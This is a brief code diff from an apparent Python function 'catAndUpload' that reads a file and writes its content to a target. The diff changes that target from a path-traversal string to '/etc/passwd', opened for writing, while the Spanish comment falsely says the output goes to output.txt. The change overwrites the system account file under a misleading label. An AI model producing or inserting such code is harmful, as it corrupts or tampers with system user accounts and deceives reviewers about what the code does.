@@ -47,7 +47,7 @@ def catAndUpload(filename, token):
         content = f.read()
 
     # Guardar el contenido en output.txt
-    output_filename = '../../../../../../../etc/passwd'
+    output_filename = '/etc/passwd'
     with open(output_filename, 'w') as f:
         f.write(content)
 
